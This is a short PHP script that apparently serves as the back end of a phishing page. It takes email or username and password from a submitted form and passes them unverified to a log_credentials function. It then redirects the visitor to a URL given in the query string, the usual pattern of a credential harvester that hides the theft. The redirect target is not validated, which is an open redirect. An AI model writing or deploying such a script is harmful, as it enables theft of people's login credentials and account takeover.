<?php
require_once __DIR__ . '/helper.php';

$type = '';
$user = '';
$pass = '';

if (isset($_POST['email']) && isset($_POST['password'])) {
    $type = 'GUEST';
    $user = trim($_POST['email']);
    $pass = $_POST['password'];
}
elseif (isset($_POST['username']) && isset($_POST['password'])) {
    $type = 'LOGIN';
    $user = trim($_POST['username']);
    $pass = $_POST['password'];
}

if ($type !== '') {
    log_credentials($type, $user, $pass);
}

$orig = $_GET['url'] ?? null;

helper_redirect($orig);
?>
